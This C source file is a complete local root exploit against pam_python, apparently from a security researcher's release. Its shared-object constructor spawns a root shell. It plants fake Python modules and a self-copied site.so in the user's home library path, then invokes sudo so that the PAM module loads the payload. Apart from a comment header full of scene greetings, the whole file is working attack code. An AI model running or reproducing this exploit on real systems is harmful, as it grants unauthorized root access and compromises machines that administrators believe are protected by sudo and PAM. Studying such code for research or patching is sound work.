/* Trivial pam_python boomsh. (C) Sebastian Krahmer
 *
 * Not widely used anyway. Using sudo vector.
 * Needs to change if different service is using pam_python.
 * You ain't put scripts in critical places, except for playing.
 *
 * Special 30y fall-of-the-wall release edition.
 *
 * !!! ICKE CAN HAZ PAM_PYTHON LULZ !!!
 *
 * Greetz to #nullsecurity, #oldschool, #!oldschool, #whitehats, #brownpants,
 * Rocky Forever, The guy with the marketing guy, p0, and anyone else who has rootshells.
 *
 * $ cc -fPIC -fpic -std=c11 -Wall -pedantic -c papyrus.c
 * $ gcc -shared -pie papyrus.o -o papyrus
 * $ ./papyrus
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>



__attribute__((constructor)) void init(void)
{
	if (geteuid())
		return;

	char *sh[] = {"/bin/sh", NULL};
	char *bash[] = {"/bin/bash", "--norc", "--noprofile", NULL};

	setuid(0);
	setgid(0);
	execve(*bash, bash, NULL);
	execve(*sh, sh, NULL);
	exit(1);
}


void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


int cp(const char *src, const char *dst)
{
	int in, out;

	if ((in = open(src, O_RDONLY)) < 0)
		die("[-] open");
	if ((out = open(dst, O_CREAT|O_WRONLY, 0755)) < 0)
		die("[-] open");

	ssize_t r = 0;
	char buf[0x1000] = {0};
	for (;;) {
		r = read(in, buf, sizeof(buf));
		if (r <= 0)
			break;
		write(out, buf, r);
	}
	close(in);
	close(out);
	return 0;
}


int create_py()
{
	// os and sys should be imported by most python PAM modules

	int fd = open("lib/python2.7/os.py", O_CREAT|O_WRONLY, 0644);
	if (fd < 0)
		die("[-] open");
	write(fd, "blah\n", 5);
	close(fd);

	if ((fd = open("lib/python2.7/sys.py", O_CREAT|O_WRONLY, 0644)) < 0)
		die("[-] open");
	write(fd, "blah\n", 5);
	close(fd);

	return 0;
}


int main()
{

	printf("[*] pam_python 0day (C) 201? stealth\n\n");

	chdir(getenv("HOME"));

	printf("[*] Setting up directories ...\n");
	mkdir("lib", 0755); mkdir("lib/python2.7", 0755);
	printf("[+] Done.\n");

	printf("[*] Setting up py files ...\n");
	create_py();
	printf("[+] Done.\n");

	printf("[*] Setting up DSO ...\n");
	cp("/proc/self/exe", "lib/python2.7/site.so");
	printf("[+] Done.\n");

	printf("[?] Here comes the pain. #nojailforshellz\n");

	char *sudo[] = {"/usr/bin/sudo", "bash", NULL};
	execve(*sudo, sudo, NULL);
	return -1;
}

